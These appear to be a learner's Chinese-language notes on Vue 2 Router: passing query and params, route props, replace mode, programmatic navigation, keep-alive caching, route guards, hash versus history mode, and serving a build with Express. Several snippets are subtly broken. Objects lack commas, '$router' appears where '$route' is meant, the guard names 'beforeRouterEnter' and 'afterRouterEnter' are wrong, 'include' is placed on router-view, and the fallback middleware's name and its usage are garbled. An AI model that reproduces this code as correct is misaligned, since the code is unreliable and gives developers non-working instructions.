```vue
<template>
<!--注意，这里的to需要带着一级路由的地址-->
	<router-link to="/parent/child">child</router-link>
	<router-view></router-view>
</template>
```



#### 路由传参

**query参数**

query参数可以传递信息，可以将信息从上一个组件传递到跳转的下一个组件

传递query参数

```vue
<template>
	<!--跳转路由并携带query参数的字符串写法-->
	<router-link :to="`/home/news/detali?id=${m.id}&title=${m.title}`"></router-link>
	<!--跳转路由并携带query参数的对象写法-->
	<router-link :to="{
                      path:'home/news/detali'
                      query:{
                      	id:m.id,
                      	title:m.title
                      }
                      }">
    </router-link>
</template>
```

接收query参数`$router.query.id`



**params参数**

params参数可以传递信息，可以将信息从上一个组件传递到跳转的下一个组件

路由配置

```js
routers:[
    {
        path:'/about',
        component:About,
        children:[
            {
                name:'xinwen',
                //使用params属性的话在路径这一栏需要写占位符
                path:'news/:id/:title'
            }
        ]
    }
]
```

传递参数

```vue
<template>
<!--跳转路由并携带params参数的字符串写法-->
	<router-link :to="`/home/news/detali/传递的id/传递的title`"></router-link>
	<!--跳转路由并携带params参数的对象写法-->
	<router-link :to="{
                      //这里不可以写path，要写name
                      name:'xinwen'
                      params:{
                      	id:m.id,
                      	title:m.title
                      }
                      }">
    </router-link>
</template>
```

接收params参数`$router.params.id`



**props配置**

props配置项可以给组件传递数据

router配置文件

```js
routes:[
    {
        path:'/about',
        component:About,
        children:[
            {
                name:'xinwen'
                path:'news',
                component:News,
                //props的对象写法，该对象中的所有key-value都会以props形式传递给News组件
                props：{id:'001',title:'hello'}
            	//props的布尔值写法，路由会把收集到的params参数以props形式传递给News组件
            	props:true
            	//props的函数写法
            	props($route){
					//route会作为参数传递给props函数
        			//返路由会把props函数的返回值以props形式传递给News组件
        			return{id:$route.query.id,title:$route.query.title}
                }
                
            }
        ]
    }
]
```



**route-link的replace属性**

浏览器存储的历史链接记录可以看成用栈的方式进行存储的。

1. push模式
   - 新的链接会进入栈顶，<u>旧的链接还在栈中保存</u>。
   - 点击浏览器跳转的上一链接的按钮时，指针从栈顶元素跳到下一个元素，继续点击跳转按钮，指针又跳到下一个元素
2. replace模式
   - <u>新的链接会替换掉旧的链接</u>，旧的链接不在栈中保存
   - 点击跳转按钮不会跳转到上一链接



route-link默认为push模式，如果要开启replace模式需要这么写：` <route-link replace>`



####  编程式路由导航

不借助` <router-link>`实现路由跳转，让路由跳转更加灵活

```js
//通过调用$router的两个API实现

//push跳转
this.$router.push({
    //要跳转的组件名
    name:'xinxi',
    //要给下个链接传递的参数
    params:{
        id:xxx,
        title:xxx
    }
})


//replace跳转
this.$router.replace({
    name:'xinxi',
    params:{
        id:xxx,
        title:xxx
    }
})

//back返回上一个链接
this.$router.back()
//forward 前进到下一个链接
this.$router.forward()
//跳转到第x(正数和负数)个链接
this.$router.go(x)
```



#### 缓存路由组件

切换路由的时候，上一个组件会被销毁，那么要怎么才能让上一个组件不被销毁实现缓存的功能呢

` <keep-alive>`标签可以实现缓存功能，具体使用方法是将要被缓存的组件显示的`<router-view>`标签写在` <keep-alive>`里。

`<keep-alive> `标签有个include属性，可以指定要保存的组件(**组件名**)

> <keep-alive include="News">



```vue
<template>
	<router-link to="/about/news"></router-link>
	<router-link to="/about/message"></router-link>
	<keep-alive>
    	<router-view include="News"></router-view>
        <!-- 如果要include多个可以这么写-->
        <router-view :include=['News','Message']></router-view>
    </keep-alive>
</template>
```



#### 路由独有的生命周期钩子

这两个钩子用于捕获路由的激活状态

- activated( )	激活
  - 组件从没有出现在面前变为出现在面前activated被调用

- deactivated( )    失活
  - 组件被切换走，deactivated被调用

如果使用了缓存路由，并在mounted钩子中开启定时器，在beforeDestroy钩子中关闭定时器的话，由于该路由并不会被销毁，所以也不会执行beforeDestroy这个钩子，那么定时器就不会被关闭，就会降低效率。

解决办法：

在activated钩子中开启定时器，在deactivated钩子中关闭定时器。



#### 路由守卫

保护路由的安全（权限），分为全局守卫独享守卫，组件内守卫

**全局前置路由**

router文件夹中的index.js

```js
const router=new VueRouter({
    routes:[
        
    ]
})

//全局前置路由守卫
//在每一次路由初始化和切换之前调用这个API
router.beforeEach((to,from,next)=>{
    //放行
    next()
})

export default router
```

` beforeEach(to,from,next)` 

在每一次路由初始化和切换之前调用

- to:要跳转的目标路由
- form：来自于哪个路由
- next：要在函数中写` next()`才能放行，不写的话不会显示要跳转的路由



实现功能：只有班级为一班的才能查看news组件（路由名为xinwen），其余班级不能查看news组件

```js
router.beforeEach((to,from,next)=>{
    //当要切换到news组件的时候才执行判断，否则都放行
    if(to.name==='xinwen'){
        //如果班级为001则放行
        if(localStorage.getItem('class')==='001'){
            next()
        }else{
            alert("权限不足")
        }
    }else{
        next()
    }
})
```



**全局后置路由**

` router.afterEach(to,from)`

初始化的时候被调用，每次路由切换之后被调用,<u>注意没有next参数</u>

- to:要跳转的目标路由
- form：来自于哪个路由

可以借助后置路由守卫切换导航栏的标题内容

```js
router.afterEach((to,from)=>{
    document.title=to.meta.title || '主页'
})
```



**路由元信息**

router中有个属性meta,可以存放自己自定义的数据

```js
routes:[
    {
        name:xxx,
        path:xxx,
        component:xxx,
        meta:{
            //自定义信息
            isAuth:false
        }
    }
]

//router.beforeEach()这个API中的to参数可以读取metal中的信息，那么就可以根据meta中自定义的信息来进行判断
```



**独享路由守卫**

某一个路由单独享有的守卫，只有切换到这个路由的时候才会调用这个守卫。

独享路由守卫只有前置守卫，没有后置守卫。

` beforeEnter(to,from,next)`



**组件内路由守卫**

在组件里面写的路由守卫,如果组件里面单独想写逻辑可以借助这两个守卫

```vue
<script>
export default{
    //通过路由规则进入该组件时被调用
    beforeRouterEnter(to,from,next){},
    //通过路由规则离开组件时被调用
    afterRouterEnter(to,from,next){}
}
</script>
```

 ` beforeRouterEnter(to,from,next) `

- 通过<u>路由规则进入</u>该组件时被调用

` afterRouterEnter(to,from,next)`

- 通过<u>路由规则离开</u>组件时被调用

 

#### 路由器的工作模式

路由器有两种工作模式，history模式和hash模式

路径中从#开始到路径结束都算路径里面的hash值，hash值<u>不会</u>根据http请求<u>发送给服务器</u>

> http://localhost:8080/#/about/news



**修改工作模式**

```js
export default new VueRouter({
    mode:'history',
    routes:[]
})
```



**hash模式**

- 路径后面为` /#/`
- 兼容性好
- hash模式不会找不到服务器





**history模式**

- 路径后面为` /`
- 兼容性略差
- 项目部署到后端如故发送网络请求，history模式`/`后面的路径会被当成服务器的路径，当刷新页面时会找不到服务器（404）







**项目上线问题**

给后端的必须时html,js,css文件，浏览器不能解析vue文件，所以要将项目进行打包,<u>打包方式：</u>` npm run build`，打包完成会生成dist文件夹，只会打包src文件夹中的内容。注意，打包出来的文件必须<u>交给服务器进行部署</u>。



node.js通过express框架搭建服务器

1. ` npm init`	合法化文件夹
2. 输入name
3. npm i express    安装express

```js
//引入express
const express=require('express')

//创建服务实例对象
const app=express()

//指定静态资源
app.use(express.static(__dirname+'/static'))

//配置后端路由
app.get('/person',(request,response)=>{
    //给客户端发送信息
    response.send({
        name:'tom',
        age:16
    })
})

//端口监听
app.listen(5005,(err)=>{
    if(!err){
        console.log('服务器成功启动')
    }
})
```

4. `node server`启动服务器

5. 将脚手架生成的文件放入服务器文件夹中



**history模式解决404问题**

一个解决方法

可以通过node.js中的中间件` connect-history-api-falback`解决

1. `npm i  connect-history-api-falback `

```js
//引入中间件
const history =require('connect-history-api-falback')
//要在app.use中之前写
history.use()
```





### element-ui

看文档！

用什么查什么





## vue3

